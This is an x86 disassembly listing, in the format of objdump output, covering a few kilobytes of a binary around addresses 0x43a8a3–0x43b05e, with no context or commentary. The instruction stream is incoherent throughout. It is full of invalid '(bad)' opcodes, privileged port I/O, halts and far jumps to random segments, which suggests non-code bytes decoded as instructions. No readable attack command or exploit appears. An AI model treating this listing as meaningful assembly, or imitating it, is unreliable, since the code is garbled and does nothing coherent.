  43a8a3:	ins    DWORD PTR es:[edi],dx
  43a8a4:	adc    eax,0xbf71ad77
  43a8a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a8aa:	fild   DWORD PTR [ecx+ecx*8]
  43a8ad:	push   ss
  43a8ae:	js     0x43a8d8
  43a8b0:	xor    cl,bl
  43a8b2:	mov    ecx,0xfa38f28c
  43a8b7:	call   0x8623:0xe368cd34
  43a8be:	stos   BYTE PTR es:[edi],al
  43a8bf:	push   eax
  43a8c0:	pop    ebp
  43a8c1:	mov    ds:0xa3f14bbb,al
  43a8c6:	out    dx,eax
  43a8c7:	mov    bh,BYTE PTR [eax+0x35]
  43a8ca:	mov    dl,cl
  43a8cc:	les    edx,FWORD PTR [ecx-0x4ea4fb33]
  43a8d2:	outs   dx,DWORD PTR ds:[esi]
  43a8d3:	add    BYTE PTR [ebx],dh
  43a8d5:	(bad)  
  43a8d6:	test   al,0xf4
  43a8d8:	out    0x6c,eax
  43a8da:	mov    edx,0x4baeedb1
  43a8df:	out    0xdf,al
  43a8e1:	pop    edx
  43a8e2:	cli    
  43a8e3:	push   esp
  43a8e4:	loope  0x43a935
  43a8e6:	mov    al,0x74
  43a8e8:	pusha  
  43a8e9:	shl    al,cl
  43a8eb:	shl    DWORD PTR ds:0x63ecbd45,1
  43a8f1:	push   0x2aa8b477
  43a8f6:	mov    ebx,es
  43a8f8:	cdq    
  43a8f9:	fmul   DWORD PTR [edx-0x34]
  43a8fc:	stos   DWORD PTR es:[edi],eax
  43a8fd:	(bad)  
  43a8fe:	sti    
  43a8ff:	rcl    DWORD PTR [edi],0x64
  43a902:	fdiv   DWORD PTR [esi-0x5c]
  43a905:	repz mov esi,0x11685b08
  43a90b:	in     al,0x48
  43a90d:	aam    0xb1
  43a90f:	push   esp
  43a910:	sub    BYTE PTR ds:0x8615cd5c,dh
  43a916:	cwde   
  43a917:	in     eax,0xb0
  43a919:	std    
  43a91a:	fwait
  43a91b:	mov    ah,0x1a
  43a91d:	imul   esi,DWORD PTR [ecx],0x77be4d67
  43a923:	xor    al,BYTE PTR [edx-0x58]
  43a926:	cmp    ebx,DWORD PTR [esi]
  43a928:	xchg   edx,eax
  43a929:	push   ds
  43a92a:	(bad)  
  43a92b:	aaa    
  43a92c:	rcr    dh,0xa3
  43a92f:	rol    BYTE PTR [ecx],0x43
  43a932:	mov    edi,0xea0e7494
  43a937:	icebp  
  43a938:	in     eax,0x64
  43a93a:	mov    ah,0xec
  43a93c:	psubd  mm3,QWORD PTR [ebx]
  43a93f:	in     al,dx
  43a940:	xchg   esi,eax
  43a941:	daa    
  43a942:	lods   al,BYTE PTR ds:[esi]
  43a943:	cmp    BYTE PTR [eax],ah
  43a945:	dec    ebp
  43a946:	mov    dl,0x84
  43a948:	pusha  
  43a949:	fwait
  43a94a:	icebp  
  43a94b:	les    edx,FWORD PTR [esi+0x2e]
  43a94e:	push   ebp
  43a94f:	add    dl,bl
  43a951:	test   al,al
  43a953:	xor    eax,0xe88fbb27
  43a958:	ss pushf 
  43a95a:	pop    ebx
  43a95b:	cmp    BYTE PTR [eax-0x3ef48290],dh
  43a961:	sahf   
  43a962:	jmp    0x43a8f6
  43a964:	mov    edx,0xc3f7f311
  43a969:	fdiv   DWORD PTR [edx+0x3a]
  43a96c:	ss mov ecx,0x93c5c54d
  43a972:	pushf  
  43a973:	das    
  43a974:	and    DWORD PTR [ebx+0x65],ebx
  43a977:	or     BYTE PTR [ebx+0x7f],bh
  43a97a:	cwde   
  43a97b:	sar    BYTE PTR [edi-0x2d],cl
  43a97e:	mov    edx,0x1f7b8644
  43a983:	dec    edx
  43a984:	adc    eax,0x4ef24af2
  43a989:	pop    ebp
  43a98a:	inc    ebp
  43a98b:	xchg   ebx,eax
  43a98c:	dec    ebx
  43a98d:	or     ecx,ebx
  43a98f:	pop    edx
  43a990:	push   eax
  43a991:	push   esi
  43a992:	push   edi
  43a993:	mov    ah,0x81
  43a995:	imul   ecx,edx,0xfbf61571
  43a99b:	jmp    0xb92b:0x2fdbdbb4
  43a9a2:	scas   eax,DWORD PTR es:[edi]
  43a9a3:	and    BYTE PTR [edi+edx*1-0x13db686e],bl
  43a9aa:	cmp    dh,BYTE PTR [edi-0x193ffe2b]
  43a9b0:	push   esi
  43a9b1:	jmp    0x72deb5fd
  43a9b6:	add    al,0x37
  43a9b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a9b9:	add    eax,0x35242502
  43a9be:	call   0x1dab:0x2ae36782
  43a9c5:	inc    esi
  43a9c6:	or     dh,BYTE PTR [ecx-0x1a555ba5]
  43a9cc:	jo     0x43aa19
  43a9ce:	scas   al,BYTE PTR es:[edi]
  43a9cf:	mov    ecx,0x94b7fd39
  43a9d4:	ds sbb bh,ch
  43a9d7:	test   DWORD PTR ds:0x84ecc3a5,eax
  43a9dd:	mov    ah,0xbe
  43a9df:	cmp    ebp,DWORD PTR [ecx+ebp*4]
  43a9e2:	xor    dl,ch
  43a9e4:	inc    esi
  43a9e5:	daa    
  43a9e6:	and    ebx,eax
  43a9e8:	arpl   si,si
  43a9ea:	lea    ebp,[ebx]
  43a9ec:	stos   DWORD PTR es:[edi],eax
  43a9ed:	hlt    
  43a9ee:	push   esi
  43a9ef:	lods   al,BYTE PTR ds:[esi]
  43a9f0:	rcr    BYTE PTR [edi-0x50],0x34
  43a9f4:	adc    dh,dl
  43a9f6:	jl     0x43a9f9
  43a9f8:	push   cs
  43a9f9:	test   eax,0xe58094ba
  43a9fe:	inc    edi
  43a9ff:	(bad)  
  43aa00:	stc    
  43aa01:	lea    esp,[esi-0x74]
  43aa04:	mov    dh,0xe9
  43aa06:	mov    edx,0x8e9809d4
  43aa0b:	shl    DWORD PTR [eax],0x56
  43aa0e:	mov    ebx,0x17b65de4
  43aa13:	mov    esi,0xbeec7ded
  43aa18:	push   0x991f1f74
  43aa1d:	xlat   BYTE PTR ds:[ebx]
  43aa1e:	xchg   esp,ebp
  43aa20:	sti    
  43aa21:	aaa    
  43aa22:	inc    edx
  43aa23:	out    0xf3,al
  43aa25:	add    bh,BYTE PTR [eax+0x639f094]
  43aa2b:	lods   eax,DWORD PTR ds:[esi]
  43aa2c:	in     eax,0x28
  43aa2e:	fsubp  st(2),st
  43aa30:	fisubr DWORD PTR [edx+0x4946330d]
  43aa36:	(bad)  
  43aa37:	int    0x2e
  43aa39:	sub    al,0x23
  43aa3b:	push   ss
  43aa3c:	mov    ds:0x65e5e88f,al
  43aa41:	sub    BYTE PTR [edi-0xf],0x80
  43aa45:	test   al,0xb7
  43aa47:	cmc    
  43aa48:	push   ss
  43aa49:	sub    DWORD PTR [eax*8+0x33a626f7],edi
  43aa50:	idiv   ebp
  43aa52:	mov    edx,0xd71ed5b1
  43aa57:	(bad)  
  43aa58:	adc    eax,0x56ecedfd
  43aa5d:	pop    ds
  43aa5e:	stos   BYTE PTR es:[edi],al
  43aa5f:	fcmovnb st,st(6)
  43aa61:	push   eax
  43aa62:	adc    eax,0xf4e03272
  43aa67:	xchg   esp,eax
  43aa68:	add    ebp,eax
  43aa6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa6b:	xchg   DWORD PTR [ecx-0x7],eax
  43aa6e:	repnz (bad) 
  43aa70:	bound  esi,QWORD PTR [edi]
  43aa72:	sub    BYTE PTR [esi-0x57],0x1b
  43aa76:	mov    dh,0x84
  43aa78:	mov    ebx,0x972483b8
  43aa7d:	push   esi
  43aa7e:	in     eax,dx
  43aa7f:	ror    ebp,1
  43aa81:	loope  0x43aae2
  43aa83:	out    dx,eax
  43aa84:	rcl    DWORD PTR [ebx+0x79],cl
  43aa87:	jl     0x43aa3c
  43aa89:	mov    ebp,0x462434c5
  43aa8e:	push   ds
  43aa8f:	cs (bad) 
  43aa91:	int    0x3b
  43aa93:	hlt    
  43aa94:	test   BYTE PTR [ebx],al
  43aa96:	aaa    
  43aa97:	les    edx,FWORD PTR [eax+0x48]
  43aa9a:	int    0xa2
  43aa9c:	mov    ecx,0x7bfd3105
  43aaa1:	fist   DWORD PTR [edx-0x3181c009]
  43aaa7:	hlt    
  43aaa8:	call   0x33d:0x45484c08
  43aaaf:	repz imul ebp,DWORD PTR [ebp+0x70],0xffffffa5
  43aab4:	sbb    al,0xc9
  43aab6:	xchg   BYTE PTR ds:0xf2f8622b,al
  43aabc:	loop   0x43aa60
  43aabe:	stos   DWORD PTR es:[edi],eax
  43aabf:	clc    
  43aac0:	retf   0xf40e
  43aac3:	sub    ebx,edx
  43aac5:	push   ds
  43aac6:	repnz sbb al,0x3d
  43aac9:	and    DWORD PTR [esi-0x6f28529a],eax
  43aacf:	xor    eax,0xf4623585
  43aad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aad5:	in     al,0xb8
  43aad7:	lods   eax,DWORD PTR ds:[esi]
  43aad8:	pop    ebx
  43aad9:	arpl   WORD PTR [edx+0x5202c7b4],di
  43aadf:	mov    WORD PTR [ebx+0x32e69986],cs
  43aae5:	mov    ebp,0x30c8a9bb
  43aaea:	sub    DWORD PTR ds:0x8be2ad19,edx
  43aaf0:	repnz sahf 
  43aaf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aaf3:	repz push ds
  43aaf5:	call   FWORD PTR [ebp-0x3bf6df64]
  43aafb:	lods   al,BYTE PTR ds:[esi]
  43aafc:	sub    al,0xe2
  43aafe:	loopne 0x43aaaf
  43ab00:	jmp    0x43aaf7
  43ab02:	jmp    0x43ab21
  43ab04:	pop    es
  43ab05:	sub    ecx,DWORD PTR ds:0x745fd13e
  43ab0b:	repz xlat BYTE PTR ds:[ebx]
  43ab0d:	mov    esi,0xdcf55507
  43ab12:	fsubp  st(4),st
  43ab14:	dec    esp
  43ab15:	push   ds
  43ab16:	fucomp st(3)
  43ab18:	(bad)  
  43ab19:	mov    ecx,0x2fb5c98
  43ab1e:	test   BYTE PTR [ecx+0x1e],bl
  43ab21:	cdq    
  43ab22:	push   0xb649662a
  43ab27:	pop    edi
  43ab28:	mov    bh,0xcf
  43ab2a:	sub    ebp,DWORD PTR [ebp-0x64]
  43ab2d:	int    0xb5
  43ab2f:	pop    ebp
  43ab30:	lahf   
  43ab31:	mov    BYTE PTR [eax+0x142ceb0a],0x64
  43ab38:	lock adc DWORD PTR [edx],esp
  43ab3b:	sub    al,0x67
  43ab3d:	out    dx,al
  43ab3e:	mov    ch,0xe4
  43ab40:	mov    DWORD PTR [edx+0x3e076f7b],ebx
  43ab46:	in     eax,dx
  43ab47:	pop    ds
  43ab48:	cmp    esp,esp
  43ab4a:	cli    
  43ab4b:	dec    edx
  43ab4c:	and    al,0x79
  43ab4e:	xor    eax,0x85ad1dfe
  43ab53:	sar    BYTE PTR [esi],cl
  43ab55:	call   0xa8f4:0xd5e356db
  43ab5c:	test   DWORD PTR ds:0x181734e1,ecx
  43ab62:	mov    eax,0xf599d334
  43ab67:	mov    WORD PTR ds:0xa5eb403f,ss
  43ab6d:	mov    ecx,0x9252717
  43ab72:	mov    ebp,0xb52773a2
  43ab77:	dec    eax
  43ab78:	in     eax,dx
  43ab79:	mov    ch,ch
  43ab7b:	jb     0x43abec
  43ab7d:	pushf  
  43ab7e:	mov    ds:0xd5b02507,eax
  43ab83:	stos   BYTE PTR es:[edi],al
  43ab84:	mov    esi,0x950cae0
  43ab89:	loop   0x43ab4a
  43ab8b:	fs inc ebx
  43ab8d:	pusha  
  43ab8e:	scas   eax,DWORD PTR es:[edi]
  43ab8f:	push   edx
  43ab90:	xchg   ebp,eax
  43ab91:	shr    DWORD PTR [ebx-0x33ac9e06],0xeb
  43ab98:	loope  0x43ac14
  43ab9a:	mov    edx,0xb016c2e7
  43ab9f:	inc    esp
  43aba0:	pop    edx
  43aba1:	xchg   ebp,eax
  43aba2:	and    bh,dl
  43aba4:	inc    ebp
  43aba5:	jmp    0x8f8d:0x7e41ece0
  43abac:	xchg   BYTE PTR [ecx],bh
  43abae:	enter  0x6666,0x13
  43abb2:	and    al,0x7f
  43abb4:	add    eax,0x5ecf27a7
  43abb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43abba:	mov    dh,0x11
  43abbc:	ja     0x43ab49
  43abbe:	rcl    BYTE PTR ds:0xf1c1b345,1
  43abc4:	leave  
  43abc5:	out    0xd,al
  43abc7:	jnp    0x43abdb
  43abc9:	inc    ebx
  43abca:	inc    esp
  43abcb:	mov    BYTE PTR [eiz*8-0x4e9fa81b],bh
  43abd2:	mov    esp,0x1f6caa24
  43abd7:	xchg   ebp,eax
  43abd8:	sbb    bh,cl
  43abda:	mov    dl,0x78
  43abdc:	mov    edi,0x13d92892
  43abe1:	jnp    0x43abae
  43abe3:	and    al,0x16
  43abe5:	xor    eax,0xa9d6671b
  43abea:	mov    cs,WORD PTR [ebp-0x53]
  43abed:	pushf  
  43abee:	jmp    0x43ac56
  43abf0:	fadd   QWORD PTR [edx]
  43abf2:	call   0x8875131b
  43abf7:	push   0x1
  43abf9:	jecxz  0x43ac23
  43abfb:	add    eax,0x62b47036
  43ac00:	ins    DWORD PTR es:[edi],dx
  43ac01:	gs aam 0xe5
  43ac04:	and    al,0x9e
  43ac06:	sub    edx,esi
  43ac08:	pusha  
  43ac09:	ror    BYTE PTR [ecx-0x60da1ab5],0xac
  43ac10:	push   edi
  43ac11:	or     DWORD PTR [edx],esp
  43ac13:	mov    ch,0x21
  43ac15:	adc    DWORD PTR [esi],ebx
  43ac17:	cmc    
  43ac18:	xchg   DWORD PTR [esi],ebx
  43ac1a:	mov    ds:0x313fe567,eax
  43ac1f:	icebp  
  43ac20:	loope  0x43abd8
  43ac22:	inc    eax
  43ac23:	jae    0x43ac3c
  43ac25:	imul   esp,DWORD PTR [ebx],0x46702779
  43ac2b:	mov    al,0xc2
  43ac2d:	or     eax,0x7efd40dc
  43ac32:	lods   eax,DWORD PTR ds:[esi]
  43ac33:	push   esi
  43ac34:	scas   eax,DWORD PTR es:[edi]
  43ac35:	jno    0x43ac51
  43ac37:	repnz sbb eax,0x82fddd29
  43ac3d:	mov    ds:0x993c21d7,eax
  43ac42:	jmp    0x43ac8b
  43ac44:	dec    ebx
  43ac45:	mov    dh,0x39
  43ac47:	iret   
  43ac48:	test   al,0x60
  43ac4a:	daa    
  43ac4b:	shr    ebp,cl
  43ac4d:	and    dh,BYTE PTR [esp+eax*4-0x51da3d6]
  43ac54:	mov    edi,0x3665dbd6
  43ac59:	pop    ecx
  43ac5a:	mov    ebx,ebx
  43ac5c:	mov    ah,0xa7
  43ac5e:	xchg   ebp,eax
  43ac5f:	add    al,0x75
  43ac61:	pop    ds
  43ac62:	lods   eax,DWORD PTR ds:[esi]
  43ac63:	mov    cl,0x41
  43ac65:	mov    al,ds:0x9ef0e4b1
  43ac6a:	mov    edx,eax
  43ac6c:	inc    ebp
  43ac6d:	scas   al,BYTE PTR es:[edi]
  43ac6e:	aas    
  43ac6f:	jmp    0xe0f2:0xa83ecbfa
  43ac76:	pusha  
  43ac77:	add    bl,BYTE PTR ds:0xb00c27c9
  43ac7d:	loopne 0x43acba
  43ac7f:	jmp    0x67ff8374
  43ac84:	add    DWORD PTR [edx-0xbe5ec27],esp
  43ac8a:	ds pop ebp
  43ac8c:	mov    BYTE PTR [eax],al
  43ac8e:	xor    BYTE PTR [edi+0x1],al
  43ac91:	mov    ch,0xe5
  43ac93:	test   BYTE PTR [esi-0x28f1a649],dh
  43ac99:	out    0xc2,eax
  43ac9b:	sbb    DWORD PTR ds:0xcaf2c493,edx
  43aca1:	icebp  
  43aca2:	or     ecx,ebp
  43aca4:	pop    ss
  43aca5:	or     DWORD PTR [edi-0xf],ebp
  43aca8:	in     eax,0xb
  43acaa:	rcl    BYTE PTR [ebp-0x44],cl
  43acad:	pushf  
  43acae:	jnp    0x43ac6e
  43acb0:	in     ax,0x4f
  43acb3:	mov    eax,0x9965c511
  43acb8:	loopne 0x43ac5e
  43acba:	jmp    0x6249:0x299f5ba4
  43acc1:	sub    al,ah
  43acc3:	andps  xmm5,XMMWORD PTR [ecx-0x3c540e22]
  43acca:	dec    ebx
  43accb:	xor    BYTE PTR [ecx+0x15e136fc],bh
  43acd1:	adc    BYTE PTR [ebp-0x2771b17c],bh
  43acd7:	inc    bp
  43acd9:	pop    ebx
  43acda:	addr16 repz pop esp
  43acdd:	dec    esp
  43acde:	aaa    
  43acdf:	pop    es
  43ace0:	inc    eax
  43ace1:	js     0x43ad1e
  43ace3:	cmp    cl,BYTE PTR [ebx-0x2dcb4f5f]
  43ace9:	out    0xf5,al
  43aceb:	and    BYTE PTR [ebp+0x15],ah
  43acee:	push   ss
  43acef:	in     al,dx
  43acf0:	imul   ebp,DWORD PTR [edi+0x39233051],0x9a50b369
  43acfa:	lahf   
  43acfb:	sahf   
  43acfc:	outs   dx,DWORD PTR ds:[esi]
  43acfd:	adc    BYTE PTR [ebx],0x26
  43ad00:	jp     0x43acdb
  43ad02:	inc    ecx
  43ad03:	jno    0x43acd3
  43ad05:	mov    esp,0xa4e124eb
  43ad0a:	jecxz  0x43ac8c
  43ad0c:	test   BYTE PTR [eax],dh
  43ad0e:	in     al,0x63
  43ad10:	js     0x43ad5d
  43ad12:	in     al,0x3b
  43ad14:	push   eax
  43ad15:	jmp    0xa3148465
  43ad1a:	sub    BYTE PTR [ebx-0x3e],bl
  43ad1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ad1e:	cmp    ebx,DWORD PTR [ebp+0x5a79bd67]
  43ad24:	test   eax,0xd76b9c6d
  43ad29:	cmc    
  43ad2a:	mov    ecx,0xd0212de4
  43ad2f:	xor    BYTE PTR ds:0x4eed726e,al
  43ad35:	fadd   st,st(1)
  43ad37:	ret    
  43ad38:	ja     0x43ad92
  43ad3a:	mov    eax,ds:0x38bb213
  43ad3f:	mov    ch,0x16
  43ad41:	adc    eax,0x9c8b760d
  43ad46:	sbb    edi,DWORD PTR [edx+ebx*2+0x59b27caf]
  43ad4d:	int3   
  43ad4e:	dec    edi
  43ad4f:	add    ebx,DWORD PTR ds:0xcbfeb58a
  43ad55:	cdq    
  43ad56:	cmp    ebp,DWORD PTR [eax+0x51]
  43ad59:	dec    ecx
  43ad5a:	ja     0x43ad5d
  43ad5c:	sub    BYTE PTR [ebp+0x7495a352],bl
  43ad62:	mov    esi,0x91af64ee
  43ad67:	cld    
  43ad68:	sbb    cl,ch
  43ad6a:	loopne 0x43ad8c
  43ad6c:	inc    eax
  43ad6d:	data16 repz mov bl,0xfa
  43ad71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ad72:	sti    
  43ad73:	imul   ebx,edx,0xe120ae84
  43ad79:	cmc    
  43ad7a:	pop    ss
  43ad7b:	sbb    ecx,DWORD PTR gs:[ecx-0x44b38c43]
  43ad82:	cwde   
  43ad83:	push   0x732ba67d
  43ad88:	mov    ?,WORD PTR [ebx-0x26]
  43ad8b:	dec    edi
  43ad8c:	fwait
  43ad8d:	push   ebx
  43ad8e:	add    al,0x7f
  43ad90:	adc    ch,dl
  43ad92:	push   es
  43ad93:	pushf  
  43ad94:	dec    esi
  43ad95:	cs cli 
  43ad97:	out    0x3,eax
  43ad99:	ret    0xc42e
  43ad9c:	shl    BYTE PTR [edx+0x2641d529],0x9d
  43ada3:	stos   BYTE PTR es:[edi],al
  43ada4:	mov    esp,0xdd24e57a
  43ada9:	out    dx,al
  43adaa:	gs dec eax
  43adac:	dec    edx
  43adad:	mov    DWORD PTR [ebp-0x48dc1a20],edi
  43adb3:	out    0x27,al
  43adb5:	loop   0x43ae10
  43adb7:	sahf   
  43adb8:	hlt    
  43adb9:	mov    al,0x97
  43adbb:	mov    ebx,DWORD PTR [ebx+edx*1+0x4f8584ba]
  43adc2:	mov    BYTE PTR [ecx],bh
  43adc4:	xor    eax,0xe9ecfeea
  43adc9:	xor    edx,DWORD PTR [bp+di-0x56db]
  43adce:	xor    ebp,ecx
  43add0:	(bad)  
  43add1:	dec    ecx
  43add2:	sbb    ch,BYTE PTR [edx+0x703ba28f]
  43add8:	mov    DWORD PTR [ebx-0x59b92c2e],0x5c1d7bc3
  43ade2:	mov    ebx,0x39dd4694
  43ade7:	inc    ecx
  43ade8:	mov    ch,0xe5
  43adea:	loopne 0x43add7
  43adec:	shr    edx,0x88
  43adef:	jbe    0x43ad78
  43adf1:	fldenv [edi]
  43adf3:	fistp  DWORD PTR [ebp-0x6dc34ab4]
  43adf9:	stos   BYTE PTR es:[edi],al
  43adfa:	mov    bl,0x4c
  43adfc:	push   ebp
  43adfd:	and    ch,dh
  43adff:	in     al,0xe4
  43ae01:	loop   0x43adb9
  43ae03:	mov    dl,0x21
  43ae05:	leave  
  43ae06:	mov    edi,0x89ebd94e
  43ae0b:	into   
  43ae0c:	in     eax,0x23
  43ae0e:	xor    eax,DWORD PTR [esi+0x46]
  43ae11:	mov    ecx,0xa6b62885
  43ae16:	jae    0x43adb5
  43ae18:	lods   al,BYTE PTR ds:[esi]
  43ae19:	add    al,0xa2
  43ae1b:	aad    0x45
  43ae1d:	sbb    dh,BYTE PTR [esi+0x71b6a8a4]
  43ae23:	dec    eax
  43ae24:	adc    eax,0x12e9400e
  43ae29:	and    ch,BYTE PTR [edi]
  43ae2b:	aam    0x17
  43ae2d:	cdq    
  43ae2e:	in     eax,0x4b
  43ae30:	enter  0x8fbd,0x1d
  43ae34:	jo     0x43ae0a
  43ae36:	stos   DWORD PTR es:[edi],eax
  43ae37:	call   0x439b:0xb787c4e9
  43ae3e:	pop    eax
  43ae3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ae40:	push   cs
  43ae41:	stos   BYTE PTR es:[edi],al
  43ae42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ae43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ae44:	mov    esp,0x56998da6
  43ae49:	inc    ebp
  43ae4a:	sbb    bh,BYTE PTR [esi+0x69aed0a8]
  43ae50:	popa   
  43ae51:	pop    eax
  43ae52:	jo     0x43ae44
  43ae54:	mov    eax,0xd8d776bc
  43ae59:	out    dx,al
  43ae5a:	sahf   
  43ae5b:	jne    0x43aeb2
  43ae5d:	std    
  43ae5e:	jb     0x43ae45
  43ae60:	popa   
  43ae61:	sub    cl,bh
  43ae63:	xor    BYTE PTR [edi],bl
  43ae65:	xchg   ecx,eax
  43ae66:	das    
  43ae67:	cld    
  43ae68:	mov    edi,0x23bc367f
  43ae6d:	stc    
  43ae6e:	mov    edi,0x40b8a5c8
  43ae73:	call   0xcadf:0x3a7b9a25
  43ae7a:	ret    
  43ae7b:	loopne 0x43ae38
  43ae7d:	mov    esp,0xe652fcd7
  43ae82:	mov    dh,0x14
  43ae84:	pop    ebp
  43ae85:	xchg   edx,eax
  43ae86:	cmp    BYTE PTR [esi+0x35],dl
  43ae89:	or     eax,0xa39ce5c1
  43ae8e:	add    al,0xee
  43ae90:	xor    DWORD PTR [ecx-0x2a],ebp
  43ae93:	mov    ds:0x353aa8bd,eax
  43ae98:	and    ebp,eax
  43ae9a:	jne    0x43af0b
  43ae9c:	(bad)
  43ae9f:	lock ins DWORD PTR es:[edi],dx
  43aea1:	jg     0x43ae85
  43aea3:	sahf   
  43aea4:	and    al,0x99
  43aea6:	mov    dl,0x4d
  43aea8:	pop    ebx
  43aea9:	cld    
  43aeaa:	xor    al,0x28
  43aeac:	call   0xab96db7b
  43aeb1:	sub    DWORD PTR [ebp+edx*8-0x51e396e8],ebx
  43aeb8:	dec    edi
  43aeb9:	rol    ebx,cl
  43aebb:	pop    es
  43aebc:	aas    
  43aebd:	xchg   esp,eax
  43aebe:	xchg   esp,eax
  43aebf:	mov    dh,0xfd
  43aec1:	add    eax,esi
  43aec3:	xor    BYTE PTR ds:0xb2fec57d,dl
  43aec9:	lahf   
  43aeca:	dec    ebx
  43aecb:	xor    esp,DWORD PTR [esi-0x59882046]
  43aed1:	mov    bl,0xa1
  43aed3:	test   al,0xd9
  43aed5:	pop    es
  43aed6:	mov    eax,0x68a65844
  43aedb:	jecxz  0x43aec2
  43aedd:	nop
  43aede:	sub    cl,dh
  43aee0:	mov    ds:0x91f79239,al
  43aee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aee6:	dec    esi
  43aee7:	mov    ebx,DWORD PTR [edx]
  43aee9:	mov    ebp,0xd073135c
  43aeee:	cmp    esp,edx
  43aef0:	mov    ebp,0x67caee6e
  43aef5:	stc    
  43aef6:	cli    
  43aef7:	int    0xb2
  43aef9:	and    BYTE PTR [ecx-0x55],al
  43aefc:	pushf  
  43aefd:	adc    esi,DWORD PTR [ebx+0x2d61e54c]
  43af03:	out    0xcc,al
  43af05:	push   ebx
  43af06:	dec    ebp
  43af07:	inc    edi
  43af08:	sbb    cl,cl
  43af0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43af0b:	mov    esp,DWORD PTR [esi+eax*1-0x6caada7b]
  43af12:	popf   
  43af13:	cdq    
  43af14:	xchg   edi,eax
  43af15:	sbb    edx,ebx
  43af17:	push   eax
  43af18:	adc    eax,0x4f35f52
  43af1d:	add    dl,bh
  43af1f:	call   0x2993:0xa5c53925
  43af26:	popf   
  43af27:	fadd   st,st(4)
  43af29:	push   cs
  43af2a:	int3   
  43af2b:	or     esp,esi
  43af2d:	mov    edx,0x90a3874a
  43af32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43af33:	in     eax,0x1f
  43af35:	jmp    0xe7db0900
  43af3a:	ss jmp 0x43af49
  43af3d:	xchg   DWORD PTR [ebx+edi*4-0x5c],edi
  43af41:	in     eax,0x3e
  43af43:	shl    BYTE PTR [ecx-0x53],0xc0
  43af47:	mov    ah,0xe2
  43af49:	fsub   QWORD PTR [eax]
  43af4b:	out    0x62,al
  43af4d:	lahf   
  43af4e:	dec    esp
  43af4f:	add    eax,0xe552ea0d
  43af54:	or     BYTE PTR [ecx+0x3b13a70c],cl
  43af5a:	lds    edx,FWORD PTR [eax+0x1ebabc2f]
  43af60:	sbb    al,0x99
  43af62:	es std 
  43af64:	sbb    eax,0x896ca160
  43af69:	ror    BYTE PTR [ebx+0x5188b033],cl
  43af6f:	mov    al,ds:0x883e3217
  43af74:	xor    eax,0x53a3471f
  43af79:	dec    ebx
  43af7a:	xchg   ecx,eax
  43af7b:	adc    BYTE PTR [ecx+0x2e20fb9d],dh
  43af81:	test   al,0xc7
  43af83:	out    0xf1,eax
  43af85:	or     DWORD PTR [esi-0x33],esi
  43af88:	outs   dx,BYTE PTR ds:[esi]
  43af89:	dec    esp
  43af8a:	test   al,0xb6
  43af8c:	jl     0x43afa7
  43af8e:	mov    dh,0x64
  43af90:	jbe    0x43af63
  43af92:	fdivr  QWORD PTR [ebp+0x58]
  43af95:	call   0xf156:0xacd9c1db
  43af9c:	push   ss
  43af9d:	sub    DWORD PTR [ebp-0x4e],esp
  43afa0:	add    edi,ebp
  43afa2:	sbb    DWORD PTR [esi],esp
  43afa4:	loop   0x43af26
  43afa6:	mov    edi,0x1c411d8f
  43afab:	cdq    
  43afac:	mov    dl,0x2f
  43afae:	rcr    DWORD PTR [ebx+0x22],1
  43afb1:	dec    ecx
  43afb2:	not    BYTE PTR [ebx]
  43afb4:	pop    edi
  43afb5:	pop    es
  43afb6:	xor    al,0xd7
  43afb8:	out    dx,al
  43afb9:	jle    0x43af97
  43afbb:	fsub   st,st(6)
  43afbd:	xchg   esp,eax
  43afbe:	popf   
  43afbf:	fild   WORD PTR [ecx+0x52]
  43afc2:	mov    eax,0xeb591666
  43afc7:	retf   0x47d9
  43afca:	cmp    al,0x78
  43afcc:	and    DWORD PTR [eax+0x738b1e4b],ebp
  43afd2:	fadd   DWORD PTR [ebx-0x5b]
  43afd5:	sbb    ecx,DWORD PTR [ebx+0x2776a80]
  43afdb:	test   DWORD PTR ds:0x1d9dd8f1,esp
  43afe1:	mov    eax,ds:0xa6d8d4cb
  43afe6:	lahf   
  43afe7:	test   BYTE PTR [eax+0x46dc8593],dh
  43afed:	jmp    0x43af85
  43afef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aff0:	lahf   
  43aff1:	and    eax,0xa5afea2d
  43aff6:	sbb    eax,DWORD PTR [ebx]
  43aff8:	sub    BYTE PTR [esi+edx*4+0x78],cl
  43affc:	aaa    
  43affd:	out    dx,eax
  43affe:	push   0xa3170af3
  43b003:	(bad)  
  43b004:	inc    ebp
  43b005:	in     al,dx
  43b006:	sub    eax,0xffffffdb
  43b009:	jae    0x43b02b
  43b00b:	das    
  43b00c:	and    eax,0x3ee833ce
  43b011:	push   ecx
  43b012:	jno    0x43b08a
  43b014:	into   
  43b015:	pushf  
  43b016:	rcl    ebx,1
  43b018:	mul    BYTE PTR [ebx+0x7af00014]
  43b01e:	jmp    0xb15b:0xbba3bf27
  43b025:	xor    bh,cl
  43b027:	fnsave [eax+0x609bf50e]
  43b02d:	fdivr  DWORD PTR [esi+0x4f1f9dd4]
  43b033:	stos   DWORD PTR es:[edi],eax
  43b034:	xor    eax,0x20f02efd
  43b039:	rol    DWORD PTR [ebx-0xb],cl
  43b03c:	and    DWORD PTR [ecx],ebp
  43b03e:	jp     0x43b015
  43b040:	mov    ch,0xee
  43b042:	dec    ebx
  43b043:	jg     0x43b0bd
  43b045:	or     BYTE PTR [edx+0x74c54612],0x0
  43b04c:	sbb    DWORD PTR ds:[edx+0x18],ecx
  43b050:	jb     0x43afd8
  43b052:	xor    al,0xb2
  43b054:	loope  0x43b006
  43b056:	mov    ebp,0x3b54e0e4
  43b05b:	ins    DWORD PTR es:[edi],dx
  43b05c:	rcr    DWORD PTR [edx],1
  43b05e:	pusha  
